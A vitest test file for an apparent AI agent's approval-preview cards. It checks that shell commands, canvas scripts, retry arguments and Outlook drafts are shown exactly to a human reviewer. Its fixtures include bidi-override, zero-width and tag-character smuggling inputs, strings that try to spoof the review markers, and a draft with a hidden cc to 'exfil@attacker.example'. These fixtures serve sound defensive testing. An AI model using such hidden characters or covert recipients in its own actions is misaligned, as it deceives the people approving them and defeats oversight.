import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import {
  formatCanvasEvalScriptForReview,
  formatToolPermissionRetryExactArgumentsForReview,
  renderAgentApprovalPreview
} from './agentApprovalPreview'

describe('agent approval preview', () => {
  it('renders shell risk labels and env deltas', () => {
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'command',
        command: 'npm install left-pad',
        cwd: '/workspace',
        riskLabels: ['workspace shell execution', 'dependency change'],
        envDeltas: { FORCE_COLOR: '0', NO_COLOR: '1' }
      })!
    )

    expect(markup).toContain('Risk')
    expect(markup).toContain('workspace shell execution, dependency change')
    expect(markup).toContain('Env deltas')
    expect(markup).toContain('FORCE_COLOR=0')
    expect(markup).toContain('NO_COLOR=1')
  })

  it('renders launch target context for approval review', () => {
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'launch-target',
        label: 'npm run dev',
        source: 'package-script',
        kindLabel: 'dev-server',
        platform: 'web',
        execution: 'long-running',
        command: 'npm run dev',
        cwd: '/workspace',
        shell: false,
        git: {
          isRepo: true,
          branch: 'feature/run-button'
        }
      })!
    )

    expect(markup).toContain('Launch context')
    expect(markup).toContain('Target: npm run dev')
    expect(markup).toContain('Source: package-script')
    expect(markup).toContain('Kind: dev-server')
    expect(markup).toContain('Platform: web')
    expect(markup).toContain('Execution: long-running')
    expect(markup).toContain('Shell: no')
    expect(markup).toContain('Branch: feature/run-button')
  })

  it('renders the exact transient canvas_eval script for human review', () => {
    const script = 'document.body.dataset.secret = "<signed-elevated>"'
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'tool',
        toolName: 'canvas_eval',
        params: { canvasId: 'canvas-1', script }
      })!
    )

    expect(markup).toContain('JavaScript to execute (control-visible exact review)')
    expect(markup).toContain('document.body.dataset.secret')
    // React escapes markup-like script content rather than interpreting it.
    expect(markup).toContain('&quot;&lt;signed-elevated&gt;&quot;')
  })

  it('makes bidi, zero-width, NUL, and line endings visible with receipt metadata', () => {
    const script = `safe\u202Ehidden\u200B\u0000\r\nnext`
    const formatted = formatCanvasEvalScriptForReview(script)
    expect(formatted).toContain('\u27e8RIGHT-TO-LEFT OVERRIDE U+202E\u27e9')
    expect(formatted).toContain('\u27e8ZERO WIDTH SPACE U+200B\u27e9')
    expect(formatted).toContain('\u27e8CONTROL U+0000\u27e9')
    expect(formatted).toContain('\u27e8CR U+000D\u27e9\u27e8LF U+000A\u27e9\n   2 \u2502 next')

    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'tool',
        toolName: 'mcp__taskwraith__canvas_eval',
        params: { canvasId: 'canvas-1', script },
        canvasEvalReceipt: {
          scriptLength: script.length,
          scriptByteLength: 24,
          scriptHash: 'a'.repeat(64)
        }
      })!
    )
    expect(markup).toContain('UTF-16:')
    expect(markup).toContain('UTF-8:')
    expect(markup).toContain('SHA-256:')
    expect(markup).toContain('RIGHT-TO-LEFT OVERRIDE U+202E')
    expect(markup).not.toContain('\u202E')
    expect(markup).not.toContain('\u200B')
    expect(markup).not.toContain('\u0000')
  })

  it('makes variation selectors and Unicode tag characters explicit', () => {
    const script = `text\uFE0Fmore\u{E0100}tag\u{E0061}end`
    const formatted = formatCanvasEvalScriptForReview(script)

    expect(formatted).toContain('⟨VARIATION SELECTOR U+FE0F⟩')
    expect(formatted).toContain('⟨VARIATION SELECTOR U+E0100⟩')
    expect(formatted).toContain('⟨UNICODE TAG U+E0061⟩')
    expect(formatted).not.toContain('\uFE0F')
    expect(formatted).not.toContain('\u{E0100}')
    expect(formatted).not.toContain('\u{E0061}')
  })

  it('cannot spoof a control marker or generated line prefix with literal script text', () => {
    const realTab = formatCanvasEvalScriptForReview('a\tb')
    const fakeTabMarker = formatCanvasEvalScriptForReview('a⟨TAB U+0009⟩b')
    expect(realTab).not.toBe(fakeTabMarker)
    expect(realTab).toContain('⟨TAB U+0009⟩')
    expect(fakeTabMarker).toContain('⟨LITERAL LEFT ANGLE BRACKET U+27E8⟩')
    expect(fakeTabMarker).toContain('⟨LITERAL RIGHT ANGLE BRACKET U+27E9⟩')

    const generatedSecondLine = formatCanvasEvalScriptForReview('a\nb')
    const literalPrefix = formatCanvasEvalScriptForReview('a⟨LF U+000A⟩\n   2 │ b')
    expect(generatedSecondLine).not.toBe(literalPrefix)
    expect(literalPrefix).toContain('⟨LITERAL BOX DRAWINGS LIGHT VERTICAL U+2502⟩')
  })

  it('renders canonical exact arguments for a one-shot permission retry', () => {
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'tool-permission-retry',
        permissionRetry: {
          targetToolName: 'write_file',
          targetArgumentsSha256: 'a'.repeat(64),
          exactArguments: {
            zLast: true,
            nested: { second: 2, first: 1 },
            aFirst: ['one', 'two']
          }
        }
      })!
    )

    expect(markup).toContain('Exact arguments for this one-shot retry (control-visible)')
    expect(markup).toContain('Target: write_file')
    expect(markup).toContain(`Arguments SHA-256: ${'a'.repeat(64)}`)
    expect(markup.indexOf('&quot;aFirst&quot;')).toBeLessThan(markup.indexOf('&quot;nested&quot;'))
    expect(markup.indexOf('&quot;nested&quot;')).toBeLessThan(markup.indexOf('&quot;zLast&quot;'))
    expect(markup.indexOf('&quot;first&quot;')).toBeLessThan(markup.indexOf('&quot;second&quot;'))
  })

  it('renders exact transient Mesh Canvas arguments for Ask and Plan review', () => {
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'tool',
        toolName: 'mcp__taskwraith__mesh_topology_edit',
        params: {
          sceneId: 'scene-a',
          nodeId: 'node-a',
          expectedRevision: 1,
          clientMutationId: 'mutation\u202Ehidden',
          operations: [
            {
              operation: 'sculpt',
              mode: 'inflate',
              center: { x: 0, y: 0, z: 0 },
              radius: 2,
              strength: 0.02
            }
          ]
        }
      })!
    )

    expect(markup).toContain('Exact Mesh Canvas arguments (control-visible)')
    expect(markup).toContain('&quot;expectedRevision&quot;: 1')
    expect(markup).toContain('&quot;operation&quot;: &quot;sculpt&quot;')
    expect(markup).toContain('RIGHT-TO-LEFT OVERRIDE U+202E')
    expect(markup).not.toContain('\u202E')
  })

  it('makes controls, bidi, zero-width text, and review-grammar literals safe in retry JSON', () => {
    const exactArguments = {
      'unsafe\u202Ekey': {
        text: 'start\u200B\u0000\u{E0061}\nend⟨LF U+000A⟩'
      }
    }
    const formatted = formatToolPermissionRetryExactArgumentsForReview(exactArguments)

    expect(formatted).toContain('⟨RIGHT-TO-LEFT OVERRIDE U+202E⟩')
    expect(formatted).toContain('⟨ZERO WIDTH SPACE U+200B⟩')
    expect(formatted).toContain('⟨CONTROL U+0000⟩')
    expect(formatted).toContain('⟨UNICODE TAG U+E0061⟩')
    expect(formatted).toContain('⟨LF U+000A⟩')
    expect(formatted).toContain('⟨LITERAL LEFT ANGLE BRACKET U+27E8⟩')
    expect(formatted).toContain('⟨LITERAL RIGHT ANGLE BRACKET U+27E9⟩')
    expect(formatted).not.toContain('\u202E')
    expect(formatted).not.toContain('\u200B')
    expect(formatted).not.toContain('\u0000')
    expect(formatted).not.toContain('\u{E0061}')

    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        permissionRetry: { exactArguments }
      })!
    )
    expect(markup).toContain('Exact arguments for this one-shot retry (control-visible)')
    expect(markup).not.toContain('\u202E')
    expect(markup).not.toContain('\u200B')
    expect(markup).not.toContain('\u0000')
  })
})

describe('outlook draft approval', () => {
  it('renders every recipient the draft will carry, cc included', () => {
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'tool',
        toolName: 'outlook_create_draft',
        params: {
          to: ['bob@example.com', 'carol@example.com'],
          cc: ['exfil@attacker.example'],
          subject: 'Weekly update',
          body: 'Line one\nLine two'
        }
      })!
    )

    expect(markup).toContain('bob@example.com, carol@example.com')
    // A cc the card does not show is a recipient the approver never agreed to.
    expect(markup).toContain('exfil@attacker.example')
    expect(markup).toContain('Weekly update')
    expect(markup).toContain('Line one\nLine two')
  })

  it('makes invisible and direction-altering code points visible in an address', () => {
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'tool',
        toolName: 'outlook_create_draft',
        // U+202E flips rendering direction; U+200B is invisible. Left literal,
        // the row would not show the address that gets written.
        params: { to: ['bob\u202E@example.com', 'ca\u200Brol@example.com'], subject: 'S' }
      })!
    )

    expect(markup).toContain('U+202E')
    expect(markup).toContain('U+200B')
    expect(markup).not.toContain('\u202E')
  })

  it('shows the location and window of a calendar entry', () => {
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'tool',
        toolName: 'outlook_create_event',
        params: {
          subject: 'Focus block',
          window: '2026-08-01T09:00 → 2026-08-01T10:00',
          location: 'Room 4',
          body: 'Agenda: everything.'
        }
      })!
    )

    expect(markup).toContain('Room 4')
    expect(markup).toContain('2026-08-01T09:00')
    expect(markup).toContain('Agenda: everything.')
  })

  it('states an empty recipient list instead of hiding the row', () => {
    const markup = renderToStaticMarkup(
      renderAgentApprovalPreview({
        kind: 'tool',
        toolName: 'outlook_create_draft',
        params: { to: [], cc: [], subject: 'Notes to self', body: 'B' }
      })!
    )

    expect(markup).toContain('(no recipients)')
    expect(markup).not.toContain('Cc')
  })
})
